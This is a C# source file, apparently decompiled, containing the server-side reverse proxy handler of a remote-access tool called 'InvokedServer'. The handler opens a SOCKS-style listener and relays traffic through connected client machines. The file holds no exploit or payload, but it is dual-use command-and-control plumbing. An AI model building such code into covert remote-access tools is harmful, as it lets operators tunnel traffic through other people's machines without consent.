

using InvokedCommon.Messages;
using InvokedCommon.Messages.ReverseProxy;
using InvokedCommon.Networking;
using InvokedServer.ReverseProxy;
using System;
using System.Collections.Generic;
using System.Linq;


namespace InvokedServer.Messages
{
	public class ReverseProxyHandler : MessageProcessorBase<ReverseProxyClient[]>
	{
		private readonly InvokedServer.Networking.Client[] _clients;
		private readonly ReverseProxyServer _socksServer;

		public ReverseProxyHandler(InvokedServer.Networking.Client[] clients)
		  : base(true)
		{
			this._socksServer = new ReverseProxyServer();
			this._clients = clients;
		}

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case ReverseProxyConnectResponse _:
				case ReverseProxyData _:
					return true;
				default:
					return message is ReverseProxyDisconnect;
			}
		}

		public override bool CanExecuteFrom(ISender sender)
		{
			return ((IEnumerable<InvokedServer.Networking.Client>)this._clients).Any<InvokedServer.Networking.Client>((Func<InvokedServer.Networking.Client, bool>)(c => c.Equals((object)sender)));
		}

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case ReverseProxyConnectResponse message1:
					this.Execute(sender, message1);
					break;
				case ReverseProxyData message2:
					this.Execute(sender, message2);
					break;
				case ReverseProxyDisconnect message3:
					this.Execute(sender, message3);
					break;
			}
		}

		public void StartReverseProxyServer(ushort port)
		{
			this._socksServer.OnConnectionEstablished += new ReverseProxyServer.ConnectionEstablishedCallback(this.socksServer_onConnectionEstablished);
			this._socksServer.OnUpdateConnection += new ReverseProxyServer.UpdateConnectionCallback(this.socksServer_onUpdateConnection);
			this._socksServer.StartServer(this._clients, "0.0.0.0", port);
		}

		public void StopReverseProxyServer()
		{
			this._socksServer.Stop();
			this._socksServer.OnConnectionEstablished -= new ReverseProxyServer.ConnectionEstablishedCallback(this.socksServer_onConnectionEstablished);
			this._socksServer.OnUpdateConnection -= new ReverseProxyServer.UpdateConnectionCallback(this.socksServer_onUpdateConnection);
		}

		private void Execute(ISender client, ReverseProxyConnectResponse message)
		{
			this._socksServer.GetClientByConnectionId(message.ConnectionId)?.HandleCommandResponse(message);
		}

		private void Execute(ISender client, ReverseProxyData message)
		{
			this._socksServer.GetClientByConnectionId(message.ConnectionId)?.SendToClient(message.Data);
		}

		private void Execute(ISender client, ReverseProxyDisconnect message)
		{
			this._socksServer.GetClientByConnectionId(message.ConnectionId)?.Disconnect();
		}

		private void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
		{
			this.OnReport(this._socksServer.OpenConnections);
		}

		private void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
		{
			this.OnReport(this._socksServer.OpenConnections);
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this.StopReverseProxyServer();
		}
	}
}